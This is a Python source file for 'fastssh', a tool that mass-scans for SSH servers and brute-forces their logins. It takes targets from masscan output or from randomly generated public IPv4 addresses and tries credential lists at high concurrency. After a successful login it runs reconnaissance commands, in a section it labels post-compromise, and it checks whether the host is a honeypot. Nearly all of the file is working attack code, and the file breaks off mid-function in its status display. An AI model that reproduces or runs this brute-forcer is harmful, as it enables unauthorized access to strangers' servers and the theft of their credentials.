#!/usr/bin/env python3
"""
fastssh - async SSH discovery and credential testing orchestrator.

Key ideas:
- Prefer external high-speed scanners (masscan/zmap) and ingest their JSON.
- Use async TCP probes to skip dead hosts before brute attempts.
- Async SSH auth attempts with tight concurrency and stop-after-first options.
- Structured JSONL output for easy parsing/resume.
"""

import argparse
import asyncio
import ipaddress
import json
import os
import random
import shutil
import contextlib
import time
import sys
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple

try:
    import orjson  # type: ignore
except ImportError:
    orjson = None

import asyncssh
try:
    from rich.console import Console, Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    from rich.table import Table

    RICH_AVAILABLE = True
except Exception:
    Console = None
    Group = None
    Live = None
    Panel = None
    Progress = None
    SpinnerColumn = None
    BarColumn = None
    TextColumn = None
    TimeElapsedColumn = None
    TimeRemainingColumn = None
    Table = None
    RICH_AVAILABLE = False


# -----------------------------------------------------------------------------
# Data classes and helpers
# -----------------------------------------------------------------------------


@dataclass
class Config:
    targets: Dict[str, Set[int]] = field(default_factory=dict)
    combos: List[Tuple[str, str]] = field(default_factory=list)
    target_state: Dict[str, int] = field(default_factory=dict)
    target_state_path: Optional[Path] = None
    target_updates: Dict[str, int] = field(default_factory=dict)
    resume_targets: bool = True
    connect_timeout: float = 3.0
    auth_timeout: float = 5.0
    read_timeout: float = 3.0
    attempt_timeout: float = 0.0  # hard ceiling per attempt; 0 means auto-calc
    max_workers: int = 200
    queue_size: int = 10000
    stop_first_host: bool = False
    stop_first_global: bool = False
    command: Optional[str] = None
    command_output: bool = True
    capture_banner: bool = False
    probe: bool = True
    shuffle: bool = True
    results_path: Path = Path("results.jsonl")
    log_interval: float = 5.0
    hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
    status_interval: float = 1.0  # cadence for status line updates
    cpu_net_interval: float = 5.0  # cadence for local cpu/net sampling
    verbose: bool = False
    require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
    gather_info: bool = False
    honeypot_detect: bool = True
    post_timeout: float = 5.0  # seconds budget for post-compromise info gathering
    age_cache: Optional[Path] = None
    gather_concurrency: int = 20
    post_process: bool = True  # run enrichment in a post phase instead of inline
    post_light: bool = False  # collect lighter info set
    cpu_net: bool = True  # enable cpu/net sampling in status
    pretty_status: bool = True  # rich-based live status when available
    auto_tune: bool = False
    tune_window: float = 20.0
    tune_min_workers: int = 50
    tune_max_workers: int = 500
    tune_step_workers: int = 25
    tune_max_timeout_ratio: float = 0.25
    tune_max_error_ratio: float = 0.15
    tune_timeout_quantile: float = 0.9
    tune_timeout_buffer: float = 0.5
    tune_timeout_floor: float = 0.5
    tune_timeout_ceiling: float = 15.0


@dataclass
class WorkItem:
    host: str
    port: int
    user: str
    password: str


@dataclass
class HostState:
    stop: asyncio.Event = field(default_factory=asyncio.Event)
    banner: Optional[str] = None


def load_lines(path: Path) -> List[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except OSError as exc:
        raise SystemExit(f"Failed to read {path}: {exc}") from exc


def parse_target(line: str, default_port: int = 22) -> Tuple[str, List[int]]:
    host = line.strip()
    if not host:
        return "", []
    if ":" in host:
        base, ports_raw = host.split(":", 1)
        ports = [int(p) for p in ports_raw.split(",") if p]
        ports = ports or [default_port]
        return base, ports
    return host, [default_port]


def load_target_state(path: Optional[Path]) -> Dict[str, int]:
    if not path:
        return {}
    try:
        data = json.loads(path.read_text())
        if isinstance(data, dict):
            return {str(k): int(v) for k, v in data.items()}
    except Exception:
        pass
    return {}


def save_target_state(path: Optional[Path], state: Dict[str, int]) -> None:
    if not path:
        return
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(state))
    except Exception as exc:
        print(f"[warn] failed to write target state {path}: {exc}", flush=True)


def collect_targets(
    args: argparse.Namespace,
    target_state: Dict[str, int],
    resume: bool,
    chunk: Optional[int],
) -> Tuple[Dict[str, Set[int]], Dict[str, int], Dict[str, int]]:
    targets: Dict[str, Set[int]] = {}
    new_state = dict(target_state)
    planned_updates: Dict[str, int] = {}

    def add_target(host: str, ports: Iterable[int]) -> None:
        if not host:
            return
        targets.setdefault(host, set()).update(ports)

    def announce_resume(src: str, start: int, total: int) -> None:
        if resume and total > 0 and start > 0:
            print(f"[resume] {src}: starting at {start}/{total}", flush=True)

    # Inline targets
    for t in args.target or []:
        try:
            host, ports = parse_target(t, args.port)
            add_target(host, ports)
        except ValueError:
            print(f"[warn] skipping invalid target entry: {t}", flush=True)

    # File-based targets (with optional resume/chunk)
    if args.targets:
        path = Path(args.targets)
        lines = load_lines(path)
        total = len(lines)
        start = new_state.get(str(path), 0) if resume else 0
        if start >= total:
            start = 0
        end = start + chunk if chunk else total
        announce_resume(str(path), start, total)
        slice_lines = lines[start:end]
        for line in slice_lines:
            try:
                host, ports = parse_target(line, args.port)
                add_target(host, ports)
            except ValueError:
                print(f"[warn] skipping invalid target line: {line}", flush=True)
        if total > 0 and resume:
            new_offset = end if end < total else 0
            planned_updates[str(path)] = new_offset

    # masscan JSON ingestion
    if args.masscan_json:
        try:
            data = json.loads(Path(args.masscan_json).read_text())
        except (OSError, json.JSONDecodeError) as exc:
            raise SystemExit(f"Failed to load masscan JSON: {exc}") from exc
        if isinstance(data, dict):
            data = [data]
        key = f"{Path(args.masscan_json)}#masscan"
        total = len(data)
        start = new_state.get(key, 0) if resume else 0
        if start >= total:
            start = 0
        end = start + chunk if chunk else total
        announce_resume(key, start, total)
        slice_data = data[start:end]
        for entry in slice_data:
            ip = entry.get("ip")
            for port_info in entry.get("ports", []):
                if port_info.get("status") != "open":
                    continue
                add_target(ip, [int(port_info.get("port", args.port))])
        if total > 0 and resume:
            new_offset = end if end < total else 0
            planned_updates[key] = new_offset

    # Random public IPv4 generation
    for _ in range(args.random or 0):
        ip = ipaddress.ip_address(".".join(str(random.randint(0, 255)) for _ in range(4)))
        if ip.is_private or ip.is_loopback or ip.is_multicast:
            continue
        add_target(str(ip), [args.port])

    if not targets:
        raise SystemExit("No targets provided.")

    return targets, new_state, planned_updates


def load_creds(args: argparse.Namespace) -> List[Tuple[str, str]]:
    combos: Set[Tuple[str, str]] = set()

    # combo file: user:pass per line
    if args.combo_file:
        for line in load_lines(Path(args.combo_file)):
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            combos.add((user, pwd))

    users: List[str] = []
    passwords: List[str] = []

    if args.user_file:
        users.extend(load_lines(Path(args.user_file)))
    if args.users:
        users.extend(args.users)
    if not users:
        users = ["root"]

    if args.pass_file:
        passwords.extend(load_lines(Path(args.pass_file)))
    if args.passwords:
        passwords.extend(args.passwords)
    if not passwords and not combos:
        passwords = ["root"]

    if not combos:
        for u in users:
            for p in passwords:
                combos.add((u, p))

    return list(combos)


def dumps_json(record: dict) -> str:
    if orjson:
        return orjson.dumps(record).decode()
    return json.dumps(record, ensure_ascii=False)


def now_ts() -> float:
    return time.time()


def load_age_cache(path: Optional[Path]) -> Dict[str, float]:
    if not path:
        return {}
    try:
        data = json.loads(path.read_text())
        if isinstance(data, dict):
            return {str(k): float(v) for k, v in data.items()}
    except Exception:
        pass
    return {}


def save_age_cache(path: Optional[Path], cache: Dict[str, float]) -> None:
    if not path:
        return
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(cache))
    except Exception as exc:
        print(f"[warn] failed to write age cache {path}: {exc}", flush=True)


# -----------------------------------------------------------------------------
# Networking helpers
# -----------------------------------------------------------------------------


async def probe_port(host: str, port: int, timeout: float) -> Optional[str]:
    """
    TCP probe to check reachability and optionally grab the SSH banner.
    """
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
        banner = None
        try:
            banner = await asyncio.wait_for(reader.read(128), timeout=timeout)
            banner = banner.decode(errors="ignore").strip()
        except Exception:
            banner = None
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
        return banner
    except Exception:
        return None


# -----------------------------------------------------------------------------
# Post-compromise enrichment
# -----------------------------------------------------------------------------


def summarize_health(load_1: float, cores: int, mem_free: int, mem_total: int, disk_free: int, disk_total: int) -> Dict[str, Any]:
    reasons = []
    status = "good"
    if cores > 0 and load_1 > cores * 2:
        reasons.append(f"high load ({load_1} on {cores} cores)")
    if mem_total > 0:
        mem_free_pct = (mem_free / mem_total) * 100
        if mem_free_pct < 5:
            reasons.append(f"low memory ({mem_free_pct:.1f}% free)")
    if disk_total > 0:
        disk_free_pct = (disk_free / disk_total) * 100
        if disk_free_pct < 5:
            reasons.append(f"low disk ({disk_free_pct:.1f}% free)")
    if reasons:
        status = "warn"
    return {"status": status, "reasons": reasons}


async def run_cmd(conn: asyncssh.SSHClientConnection, cmd: str, timeout: float) -> Dict[str, Any]:
    try:
        res = await asyncio.wait_for(conn.run(cmd, check=False), timeout=timeout)
        return {
            "ok": res.exit_status == 0,
            "stdout": res.stdout,
            "stderr": res.stderr,
            "exit_status": res.exit_status,
        }
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        return {"ok": False, "stdout": "", "stderr": str(exc), "exit_status": -1}


async def gather_info(
    conn: asyncssh.SSHClientConnection,
    cfg: Config,
    host_state: HostState,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
) -> Dict[str, Any]:
    async def do() -> Dict[str, Any]:
        info: Dict[str, Any] = {}
        ssh_info: Dict[str, Any] = {}

        host_key = conn.get_server_host_key()
        if host_key:
            ssh_info["hostkey_fingerprint"] = host_key.get_fingerprint()
            async with state_lock:
                cache = state.setdefault("age_cache", {})
                current_ts = now_ts()
                first_seen = cache.get(ssh_info["hostkey_fingerprint"])
                if not first_seen:
                    first_seen = current_ts
                    cache[ssh_info["hostkey_fingerprint"]] = first_seen
                ssh_info["first_seen"] = first_seen
                ssh_info["seen_before"] = first_seen < current_ts

        if host_state.banner:
            ssh_info["banner"] = host_state.banner
        info["ssh"] = ssh_info

        if cfg.post_light:
            sysinfo_cmds = {
                "uname": "uname -a",
                "os_release": "cat /etc/os-release",
                "load": "cat /proc/loadavg",
                "uptime": "cat /proc/uptime",
                "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
            }
        else:
            sysinfo_cmds = {
                "uname": "uname -a",
                "os_release": "cat /etc/os-release",
                "load": "cat /proc/loadavg",
                "mem": "cat /proc/meminfo",
                "disk": "df -P /",
                "uptime": "cat /proc/uptime",
                "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
                "nproc": "nproc",
            }

        cmd_results: Dict[str, Any] = {}
        lost = False
        for key, cmd in sysinfo_cmds.items():
            res = await run_cmd(conn, cmd, timeout=cfg.read_timeout)
            cmd_results[key] = res
            stderr_lower = res.get("stderr", "").lower()
            if any(term in stderr_lower for term in ["connection lost", "connection closed", "channel closed", "connection reset"]):
                lost = True
                break
        info["commands"] = cmd_results

        try:
            lines = [l.strip() for l in cmd_results.get("id", {}).get("stdout", "").splitlines() if l.strip()]
            uid = int(lines[0]) if lines else None
            user = lines[1] if len(lines) > 1 else None
            root_writable = any("root_writable" in l for l in lines)
            info["access"] = {"uid": uid, "user": user, "root_writable": root_writable}
        except Exception:
            info["access"] = {"error": "parse_failed"}

        # Basic parsing
        try:
            load_parts = cmd_results.get("load", {}).get("stdout", "").split()
            load_1 = float(load_parts[0]) if load_parts else 0.0
        except Exception:
            load_1 = 0.0
        try:
            meminfo = cmd_results.get("mem", {}).get("stdout", "")
            mem_total = mem_free = 0
            for line in meminfo.splitlines():
                if line.startswith("MemTotal:"):
                    mem_total = int(line.split()[1])
                elif line.startswith("MemAvailable:"):
                    mem_free = int(line.split()[1])
            info["memory_kb"] = {"total": mem_total, "free": mem_free}
        except Exception:
            mem_total = mem_free = 0

        disk_total = disk_free = 0
        try:
            lines = cmd_results.get("disk", {}).get("stdout", "").splitlines()
            if len(lines) >= 2:
                parts = lines[1].split()
                if len(parts) >= 4:
                    disk_total = int(parts[1])
                    disk_free = int(parts[3])
        except Exception:
            pass

        try:
            cores = int(cmd_results.get("nproc", {}).get("stdout", "").strip().splitlines()[0])
        except Exception:
            cores = 1
        info["health"] = summarize_health(load_1, cores, mem_free, mem_total, disk_free, disk_total)

        if cfg.honeypot_detect:
            hp_reasons = []
            banner = host_state.banner or ssh_info.get("banner", "")
            if banner and any(x in banner.lower() for x in ["cowrie", "kippo", "dionaea"]):
                hp_reasons.append("honeypot-like banner")
            uptime_out = cmd_results.get("uptime", {}).get("stdout", "")
            try:
                uptime_secs = float(uptime_out.split()[0])
                if uptime_secs < 300 and banner and "openssh" in banner.lower():
                    hp_reasons.append("very low uptime with normal banner")
            except Exception:
                pass
            id_exit = cmd_results.get("id", {}).get("exit_status")
            if not lost and id_exit not in (0, None):
                hp_reasons.append("basic command failures")
            if lost:
                hp_reasons.append("connection lost during info collection")
            info["honeypot"] = {"suspect": bool(hp_reasons), "reasons": hp_reasons}

        if lost:
            info["post_error"] = "connection_lost"

        return info

    try:
        return await asyncio.wait_for(do(), timeout=cfg.post_timeout)
    except asyncio.TimeoutError:
        return {"error": "post_timeout"}
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        return {"error": str(exc)}


async def run_post_processing(
    cfg: Config,
    post_queue: "asyncio.Queue[dict]",
    host_states: Dict[str, HostState],
    file_lock: asyncio.Lock,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
    gather_sem: asyncio.Semaphore,
) -> None:
    tasks = []

    async def process(record: dict) -> None:
        host = record.get("host")
        port = record.get("port")
        user = record.get("user")
        pwd = record.get("password")
        host_state = host_states.get(host, HostState())
        try:
            conn = await asyncssh.connect(
                host,
                port=port,
                username=user,
                password=pwd,
                known_hosts=None,
                client_keys=[],
                login_timeout=cfg.auth_timeout,
                connect_timeout=cfg.connect_timeout,
                compression_algs=["none"],
            )
        except Exception as exc:
            record["error"] = f"post_connect: {exc}"
            async with file_lock:
                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
                with cfg.results_path.open("a", encoding="utf-8") as f:
                    f.write(dumps_json(record) + "\n")
            return

        async with conn:
            try:
                sanity = await asyncio.wait_for(conn.run("echo fastssh_ok", check=False), timeout=cfg.read_timeout)
                if sanity.exit_status != 0:
                    raise RuntimeError(f"sanity command exit {sanity.exit_status}")
            except Exception as exc:
                record["error"] = f"post_sanity: {exc}"
                async with file_lock:
                    cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
                    with cfg.results_path.open("a", encoding="utf-8") as f:
                        f.write(dumps_json(record) + "\n")
                return

            async with gather_sem:
                extra = await gather_info(conn, cfg, host_state, state, state_lock)
                record.update(extra)

            async with file_lock:
                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
                with cfg.results_path.open("a", encoding="utf-8") as f:
                    f.write(dumps_json(record) + "\n")

    while True:
        try:
            rec = post_queue.get_nowait()
        except asyncio.QueueEmpty:
            break
        tasks.append(asyncio.create_task(process(rec)))

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


# -----------------------------------------------------------------------------
# Brute engine
# -----------------------------------------------------------------------------


async def attempt_login(
    item: WorkItem,
    cfg: Config,
    host_state: HostState,
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
    gather_sem: asyncio.Semaphore,
    post_queue: "asyncio.Queue[dict]",
) -> str:
    if global_stop.is_set() or host_state.stop.is_set():
        return "skipped"

    try:
        conn = await asyncssh.connect(
            item.host,
            port=item.port,
            username=item.user,
            password=item.password,
            known_hosts=None,
            client_keys=[],
            login_timeout=cfg.auth_timeout,
            connect_timeout=cfg.connect_timeout,
            compression_algs=["none"],
        )
    except asyncio.CancelledError:
        raise
    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError) as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] auth failed {item.host}:{item.port} {item.user}:{item.password} ({exc})", flush=True)
        return "failure"
    except OSError as exc:
        async with stats_lock:
            stats["failures"] += 1
            stats["last_progress"] = time.monotonic()
        if cfg.verbose:
            print(f"[warn] connection error {item.host}:{item.port} ({exc})", flush=True)
        return "failure"
    except Exception as exc:
        async with stats_lock:
            stats["errors"] += 1
            stats["last_progress"] = time.monotonic()
        print(f"[error] unexpected error before auth {item.host}:{item.port}: {exc}", flush=True)
        return "error"

    async with conn:
        # Sanity check that we can actually run a trivial command; if not, treat as failure.
        try:
            sanity = await asyncio.wait_for(conn.run("echo fastssh_ok", check=False), timeout=cfg.read_timeout)
            if sanity.exit_status != 0:
                raise RuntimeError(f"sanity command exit {sanity.exit_status}")
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            async with stats_lock:
                stats["failures"] += 1
                stats["last_progress"] = time.monotonic()
            if cfg.verbose:
                print(f"[warn] session unusable after auth {item.host}:{item.port}: {exc}", flush=True)
            return "failure"

        record = {
            "host": item.host,
            "port": item.port,
            "user": item.user,
            "password": item.password,
        }

        if cfg.command:
            try:
                result = await asyncio.wait_for(conn.run(cfg.command, check=False), timeout=cfg.read_timeout)
                if cfg.command_output:
                    record["command"] = cfg.command
                    record["stdout"] = result.stdout
                    record["stderr"] = result.stderr
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                record["command"] = cfg.command
                record["stdout"] = ""
                record["stderr"] = f"<command error: {exc}>"

        if host_state.banner:
            record["banner"] = host_state.banner

        if cfg.gather_info and cfg.post_process:
            await post_queue.put(record)
        elif cfg.gather_info:
            async with gather_sem:
                extra = await gather_info(conn, cfg, host_state, state, state_lock)
                record.update(extra)
            async with file_lock:
                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
                with cfg.results_path.open("a", encoding="utf-8") as f:
                    f.write(dumps_json(record) + "\n")
        else:
            async with file_lock:
                cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
                with cfg.results_path.open("a", encoding="utf-8") as f:
                    f.write(dumps_json(record) + "\n")

        async with stats_lock:
            stats["successes"] += 1
            stats["last_progress"] = time.monotonic()

        if cfg.stop_first_host:
            host_state.stop.set()
        if cfg.stop_first_global:
            global_stop.set()
        return "success"


async def worker(
    queue: "asyncio.Queue[Optional[WorkItem]]",
    cfg: Config,
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    state: Dict[str, Any],
    state_lock: asyncio.Lock,
    gather_sem: asyncio.Semaphore,
    post_queue: "asyncio.Queue[dict]",
    history: deque,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            return

        if global_stop.is_set() or host_states[item.host].stop.is_set():
            async with stats_lock:
                stats["skipped"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()
            continue

        # respect tuner-adjusted worker cap
        while True:
            async with stats_lock:
                allowed = int(stats.get("allowed_workers", cfg.max_workers))
                active_now = stats["active"]
            if active_now < allowed:
                async with stats_lock:
                    stats["active"] += 1
                break
            await asyncio.sleep(0.01)

        outcome = "error"
        start_ts = time.monotonic()
        try:
            if cfg.attempt_timeout and cfg.attempt_timeout > 0:
                outcome = await asyncio.wait_for(
                    attempt_login(
                        item,
                        cfg,
                        host_states[item.host],
                        global_stop,
                        file_lock,
                        stats,
                        stats_lock,
                        state,
                        state_lock,
                        gather_sem,
                        post_queue,
                    ),
                    timeout=cfg.attempt_timeout,
                )
            else:
                outcome = await attempt_login(
                    item,
                    cfg,
                    host_states[item.host],
                    global_stop,
                    file_lock,
                    stats,
                    stats_lock,
                    state,
                    state_lock,
                    gather_sem,
                    post_queue,
                )
        except asyncio.TimeoutError:
            async with stats_lock:
                stats["timeouts"] += 1
                stats["last_progress"] = time.monotonic()
            if cfg.verbose:
                print(
                    f"[warn] attempt watchdog timeout {item.host}:{item.port} after {cfg.attempt_timeout:.1f}s",
                    flush=True,
                )
            outcome = "timeout"
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            async with stats_lock:
                stats["errors"] += 1
                stats["last_progress"] = time.monotonic()
            print(f"[error] worker crash avoided for {item.host}:{item.port}: {exc}", flush=True)
        finally:
            duration = time.monotonic() - start_ts
            async with stats_lock:
                history.append((time.monotonic(), duration, outcome))
            async with stats_lock:
                stats["active"] = max(0, stats["active"] - 1)
                stats["attempts"] += 1
                stats["last_progress"] = time.monotonic()
            queue.task_done()


# -----------------------------------------------------------------------------
# Orchestration
# -----------------------------------------------------------------------------


async def build_queue(
    cfg: Config,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
) -> None:
    hosts = list(cfg.targets.items())
    combos = list(cfg.combos)
    if cfg.shuffle:
        random.shuffle(hosts)
        random.shuffle(combos)

    try:
        for host, ports in hosts:
            host_states.setdefault(host, HostState())
            port_list = list(ports)
            if cfg.shuffle:
                random.shuffle(port_list)
            for port in port_list:
                for user, pwd in combos:
                    if global_stop.is_set():
                        break
                    await queue.put(WorkItem(host, port, user, pwd))
    finally:
        for _ in range(cfg.max_workers):
            await queue.put(None)


async def probe_targets(cfg: Config, host_states: Dict[str, HostState]) -> None:
    if not cfg.probe:
        return
    print("[info] Probing targets...", flush=True)
    filtered: Dict[str, Set[int]] = {}
    tasks = []
    for host, ports in cfg.targets.items():
        for port in ports:
            tasks.append((host, port))

    sem = asyncio.Semaphore(cfg.max_workers)
    results: Dict[Tuple[str, int], Optional[str]] = {}
    probe_stats = {"done": 0, "live": 0, "ssh": 0, "total": len(tasks)}
    status_lock = asyncio.Lock()

    def render_status() -> str:
        return (
            f"\r[probe] {probe_stats['done']}/{probe_stats['total']} checked | "
            f"live: {probe_stats['live']} | ssh: {probe_stats['ssh']}"
        )

    async def one(host: str, port: int) -> None:
        async with sem:
            banner = await probe_port(host, port, cfg.connect_timeout)
            results[(host, port)] = banner
            is_live = banner is not None
            is_ssh = bool(banner) and banner.startswith("SSH-")
            async with status_lock:
                probe_stats["done"] += 1
                if is_live:
                    probe_stats["live"] += 1
                if is_ssh:
                    probe_stats["ssh"] += 1
                print(render_status(), end="", flush=True)

    await asyncio.gather(*(one(h, p) for h, p in tasks))
    print()  # newline after live status

    for (host, port), banner in results.items():
        if banner is not None:
            if cfg.require_ssh_banner and (not banner or not banner.startswith("SSH-")):
                continue
            filtered.setdefault(host, set()).add(port)
            if cfg.capture_banner:
                host_states.setdefault(host, HostState()).banner = banner

    cfg.targets = filtered
    if not cfg.targets:
        raise SystemExit("No live SSH targets after probing.")
    print(f"[info] Probe complete. Live hosts: {len(cfg.targets)}", flush=True)


def count_work_items(cfg: Config) -> int:
    return sum(len(ports) * len(cfg.combos) for ports in cfg.targets.values())


def drain_queue(queue: "asyncio.Queue[Optional[WorkItem]]") -> None:
    # Best-effort empty to accelerate shutdown on hang/stop.
    try:
        while True:
            item = queue.get_nowait()
            queue.task_done()
            if item is None:
                queue.put_nowait(item)
    except asyncio.QueueEmpty:
        return


async def progress_reporter(
    cfg: Config,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    queue: "asyncio.Queue[Optional[WorkItem]]",
    stop: asyncio.Event,
    global_stop: asyncio.Event,
    post_queue: "asyncio.Queue[dict]",
    history: deque,
) -> None:
    start_time = time.monotonic()
    clear_line = "\r\x1b[K"
    use_rich = RICH_AVAILABLE and cfg.pretty_status

    def read_cpu() -> Optional[Tuple[int, int]]:
        if not cfg.cpu_net:
            return None
        try:
            with open("/proc/stat", "r", encoding="utf-8") as f:
                parts = f.readline().strip().split()
            if not parts or parts[0] != "cpu":
                return None
            vals = list(map(int, parts[1:]))
            idle = vals[3] + (vals[4] if len(vals) > 4 else 0)
            total = sum(vals)
            return idle, total
        except Exception:
            return None

    def read_net() -> Optional[Tuple[int, int]]:
        if not cfg.cpu_net:
            return None
        try:
            rx = tx = 0
            with open("/proc/net/dev", "r", encoding="utf-8") as f:
                lines = f.readlines()[2:]
            for line in lines:
                if ":" not in line:
                    continue
                iface, data = line.split(":", 1)
                iface = iface.strip()
                if iface == "lo":
                    continue
                parts = data.split()
                if len(parts) >= 16:
                    rx += int(parts[0])
                    tx += int(parts[8])
            return rx, tx
        except Exception:
            return None

    def fmt_eta(seconds: Optional[float]) -> str:
        if seconds is None or seconds <= 0 or seconds == float("inf"):
            return "n/a"
        mins, secs = divmod(int(seconds), 60)
        hours, mins = divmod(mins, 60)
        if hours:
            return f"{hours}h{mins:02d}m"
        return f"{mins:02d}m{secs:02d}s"

    def render_bar(done: int, total: int) -> str:
        term_cols = shutil.get_terminal_size(fallback=(120, 20)).columns
        width = max(10, min(30, term_cols // 4))
        pct = (done / total) if total > 0 else 1.0
        pct = max(0.0, min(1.0, pct))
        filled = int(pct * width)
        empty = width - filled
        return f"[{'#' * filled}{'.' * empty}] {pct * 100:5.1f}%"

    prev_cpu = read_cpu()
    prev_net = read_net()
    prev_sample_t = time.monotonic()
    cpu_percent: Optional[float] = None
    net_rates: Tuple[Optional[float], Optional[float]] = (None, None)
    interval = cfg.status_interval if cfg.status_interval else cfg.log_interval
    interval = interval if interval and interval > 0 else 1.0
    window = cfg.tune_window if cfg.tune_window > 0 else 20.0

    async def snapshot(now: float) -> Dict[str, Any]:
        nonlocal prev_cpu, prev_net, prev_sample_t, cpu_percent, net_rates

        if now - prev_sample_t >= cfg.cpu_net_interval:
            cpu_now = read_cpu()
            net_now = read_net()
            if cpu_now and prev_cpu:
                idle_d = cpu_now[0] - prev_cpu[0]
                total_d = cpu_now[1] - prev_cpu[1]
                if total_d > 0:
                    cpu_percent = max(0.0, min(100.0, (1 - idle_d / total_d) * 100))
            if net_now and prev_net:
                delta_t = now - prev_sample_t
                rx_rate = (net_now[0] - prev_net[0]) * 8 / delta_t / 1000  # kbps
                tx_rate = (net_now[1] - prev_net[1]) * 8 / delta_t / 1000
                net_rates = (max(rx_rate, 0), max(tx_rate, 0))
            prev_cpu = cpu_now or prev_cpu
            prev_net = net_now or prev_net
            prev_sample_t = now

        async with stats_lock:
            attempts = int(stats.get("attempts", 0))
            successes = int(stats.get("successes", 0))
            failures = int(stats.get("failures", 0))
            errors = int(stats.get("errors", 0))
            skipped = int(stats.get("skipped", 0))
            timeouts = int(stats.get("timeouts", 0))
            active = int(stats.get("active", 0))
            allowed_workers = int(stats.get("allowed_workers", cfg.max_workers))
            total = int(stats.get("total", 0))
            last_progress = stats.get("last_progress", start_time)
        elapsed = now - start_time
        idle = now - last_progress if last_progress else 0.0
        done = min(attempts + skipped, total)
        pending = max(total - done, 0)
        rate = attempts / elapsed if elapsed > 0 else 0.0
        success_rate = successes / attempts if attempts else 0.0
        qsize = queue.qsize()
        eta_val = pending / rate if rate > 0 else None
        eta_str = fmt_eta(eta_val)
        cpu_str = f"{cpu_percent:.1f}%" if (cfg.cpu_net and cpu_percent is not None) else "n/a"
        rx_val, tx_val = net_rates
        if cfg.cpu_net and rx_val is not None and tx_val is not None:
            net_str = f"{rx_val / 1000:.2f}/{tx_val / 1000:.2f} Mb/s"
        else:
            net_str = "n/a"
        post_pending = post_queue.qsize() if cfg.gather_info and cfg.post_process else 0
        cutoff = now - window
        recent = [h for h in history if h[0] >= cutoff]
        sps = len(recent) / window if window > 0 else 0.0
        timeouts_r = (sum(1 for _, _, o in recent if o == "timeout") / len(recent)) if recent else 0.0
        errors_r = (sum(1 for _, _, o in recent if o == "error") / len(recent)) if recent else 0.0
        tuner_note = stats.get("tuner_note", "")
        return {
            "elapsed": elapsed,
            "idle": idle,
            "done": done,
            "pending": pending,
            "rate": rate,
            "success_rate": success_rate,
            "qsize": qsize,
            "cpu_str": cpu_str,
            "net_str": net_str,
            "post_pending": post_pending,
            "successes": successes,
            "failures": failures,
            "skipped": skipped,
            "timeouts": timeouts,
            "errors": errors,
            "active": active,
            "allowed_workers": allowed_workers,
            "total": total,
            "eta": eta_str,
            "sps": sps,
            "timeouts_r": timeouts_r,
            "errors_r": errors_r,
            "tuner_note": tuner_note,
        }

    def render_plain(metrics: Dict[str, Any]) -> str:
        bar = render_bar(metrics["done"], metrics["total"])
        status = (
            f"[status] {bar} {metrics['done']}/{metrics['total']}"
            f" | rate {metrics['rate']:.2f}/s"
            f" | sps {metrics['sps']:.2f}/s"
            f" | eta {metrics['eta']}"
            f" | active {metrics['active']}/{metrics['allowed_workers']} (max {cfg.max_workers}) q {metrics['qsize']} pend {metrics['pending']}"
            f" | succ {metrics['successes']} fail {metrics['failures']} skip {metrics['skipped']} timeouts {metrics['timeouts']} err {metrics['errors']}"
            f" | sr {metrics['success_rate']:.2%} to {metrics['timeouts_r']:.1%} err {metrics['errors_r']:.1%}"
            f" | cpu {metrics['cpu_str']}"
            f" | net {metrics['net_str']}"
            f" | idle {metrics['idle']:.1f}s"
        )
        if metrics["post_pending"]:
            status += f" | post {metrics['post_pending']}"
        if metrics["tuner_note"]:
            status += f" | tuner {metrics['tuner_note']}"
        cols = shutil.get_terminal_size(fallback=(120, 20)).columns
        if cols > 0 and len(status) >= cols:
            max_len = max(10, cols - 1)
            status = status[: max_len - 3] + "..."
        return status

    def render_rich(metrics: Dict[str, Any], progress: Progress, task_id: int) -> "Panel":
        total = metrics["total"] or metrics["done"]
        progress.update(task_id, completed=metrics["done"], total=total)
        grid = Table.grid(expand=True)
        grid.add_row(
            f"[cyan]Rate[/] {metrics['rate']:.2f}/s | SPS {metrics['sps']:.2f}/s | ETA {metrics['eta']} | Idle {metrics['idle']:.1f}s",
